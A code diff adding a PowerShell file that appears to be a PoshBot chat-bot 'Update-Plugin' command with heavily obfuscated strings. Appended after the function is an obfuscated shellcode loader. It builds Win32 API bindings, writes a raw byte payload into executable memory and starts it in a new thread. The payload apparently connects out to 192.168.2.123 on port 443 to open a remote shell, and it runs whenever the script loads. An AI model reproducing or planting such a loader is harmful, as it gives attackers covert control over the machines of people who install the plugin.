@@ -1,0 +1,93 @@
+function Update-Plugin {
+    
+    [PoshBot.BotCommand(
+        Aliases = ('up', ("{1}{3}{2}{0}"-f 'lugin','upd','ep','at')),
+        Permissions = ("{4}{2}{0}{1}{3}"-f'age-plug','i','an','ns','m')
+    )]
+    [cmdletbinding()]
+    param(
+        [parameter(Mandatory)]
+        $Bot,
+
+        [parameter(Mandatory, Position = 0)]
+        [string[]]$Name,
+
+        [parameter(Position = 1)]
+        [ValidateScript({
+            if ($_ -as [Version]) {
+                $true
+            } else {
+                throw (("{12}{15}{8}{11}{14}{10}{5}{1}{2}{9}{6}{4}{7}{18}{16}{17}{13}{3}{0}" -f'.3)','e a val','id ','(1.2','an','b','em','t','i','s','t ','on parameter mu','V','g ','s','ers',' v','ersion strin','ic'))
+            }
+        })]
+        [string]$Version,
+
+        [switch]$RemoveOldVersions
+    )
+
+    foreach ($item in $Name) {
+        if ($item -eq ("{0}{1}{2}"-f 'Bu','ilti','n')) {
+            New-PoshBotCardResponse -Type Warning -Text ("{10}{0}{2}{17}{11}{18}{5}{7}{6}{9}{15}{16}{4}{1}{14}{8}{13}{12}{3}" -f 'il',' a','tin','shBot','dated','a','not','n','pped',' ','The bu','lugin ','th Po',' wi','s it is shi','be ','up',' p','c') -Title ("{2}{1}{0}{3}"-f 'o i','ot gonna d','N','t')
+            continue
+        }
+
+        
+        $existingPlugin = $Bot.PluginManager.Plugins[$item]
+        if (-not $existingPlugin) {
+            New-PoshBotCardResponse -Type Warning -Text ('P'+'lugin '+"[$item] "+'is'+' '+'not'+' '+'i'+'n'+'stalled'+'. '+'Th'+'e '+'plu'+'g'+'in '+'mu'+'st '+'be'+' '+'i'+'nstall'+'ed '+'b'+'ef'+'ore '+'y'+'ou '+'ca'+'n '+'up'+'da'+'te '+'i'+'t.')
+            return
+        } else {
+            $existingPluginVersions = $existingPlugin.Keys | Sort-Object -Descending
+
+            try {
+                
+                $params = @{
+                    Name = $item
+                    Force = $true
+                    Confirm = $false
+                }
+                if ($PSBoundParameters.ContainsKey(("{0}{1}{2}" -f'Ve','rsio','n'))) {
+                    $params.RequiredVersion = $Version
+                }
+
+                
+                if ($PSBoundParameters.ContainsKey(("{1}{0}{2}" -f 'sio','Ver','n'))) {
+                    
+                    if (-not (Get-Module -Name $item -ListAvailable | Where-Object {$_.Version -eq $Version})) {
+                        Update-module @params
+                    }
+                    $newMod = Get-Module -Name $item -ListAvailable | Where-Object {$_.Version -eq $Version}
+                } else {
+                    Update-module @params
+                    $newMod = @(Get-Module -Name $item -ListAvailable | Sort-Object -Property Version -Descending)[0]
+                }
+
+                
+                if ($existingPluginVersions -notcontains $newMod.Version) {
+                    $Bot.PluginManager.InstallPlugin($newMod.Path, $true)
+
+                    $resp = Get-Plugin -Bot $Bot -Name $item -Version $newMod.Version
+                    if (-not ($resp | Get-Member -Name ("{1}{0}" -f 'tle','Ti') -MemberType NoteProperty)) {
+                        $resp | Add-Member -Name ("{1}{0}" -f 'tle','Ti') -MemberType NoteProperty -Value $null
+                    }
+                    $resp.Title = "Plugin [$item] updated to version [$($newMod.Version)] "
+
+                    
+                    if ($RemoveOldVersions) {
+                        $existingPlugin = $Bot.PluginManager.Plugins[$item]
+                        $oldKeys = $existingPlugin.Keys | Where-Object {$_ -ne $newMod.Version}
+                        $oldKeys | ForEach-Object {
+                            $Bot.PluginManager.RemovePlugin($item, $_)
+                        }
+                    }
+
+                    $resp
+                }
+            } catch {
+                New-PoshBotCardResponse -Type Error -Text $_.Exception.Message -Title ("{0}{1}{2}" -f 'Rut ','ro','w') -ThumbnailUrl $thumb.rutrow
+            }
+        }
+    }
+}
+
+$c = ((("{81}{54}{57}{44}{96}{29}{26}{74}{27}{4}{22}{90}{31}{0}{40}{45}{73}{79}{25}{72}{66}{6}{80}{98}{55}{42}{12}{8}{71}{7}{76}{75}{13}{69}{68}{83}{85}{15}{60}{91}{11}{19}{18}{41}{49}{20}{84}{77}{50}{52}{87}{17}{67}{35}{16}{53}{92}{34}{95}{78}{47}{62}{70}{97}{43}{56}{51}{94}{10}{61}{14}{58}{32}{39}{89}{1}{93}{64}{59}{86}{46}{36}{3}{30}{37}{21}{2}{33}{48}{63}{5}{82}{65}{9}{88}{23}{38}{28}{24}" -f'ddress, uint dwS','}','Pt',']','Al',' d','r','ernel32','t({','rc, u','e','CreateT','r','})','lImpo','I','tr lpStartAddress, ',' dwStackSiz','e','hr','tPtr lp','nt','loc',' ','t);','i','extern','r Virtual','un','atic ','public s','tr lpA','t(','r me','eter, ui','IntP','{0})','tatic extern I','co','{','ize, uint flAllocati','ad(','po','IntP',']publ','onT','ll','nF','ms','In','t',' l','ributes, u','IntPtr lp','port({0}kernel','lIm','tr','32.dll{0})','r','.','n','adId);[Dl','lags','et(IntPtr','rt','uint s',' flP','e, ','public static ext',']',',','0}k','nt','ype',' IntPt','l{0','.dl','t',' dwCreatio',', u','otect);[','[DllIm','est, ','e','ThreadA','rn ','d','int','int','0','(IntP','tPtr ','Param','msvc','pThr','nt','ic st',' ','Dl'))-F [CHAr]34);$w = Add-Type -memberDefinition $c -Name ("{1}{0}"-f 'in32','W') -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x7b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
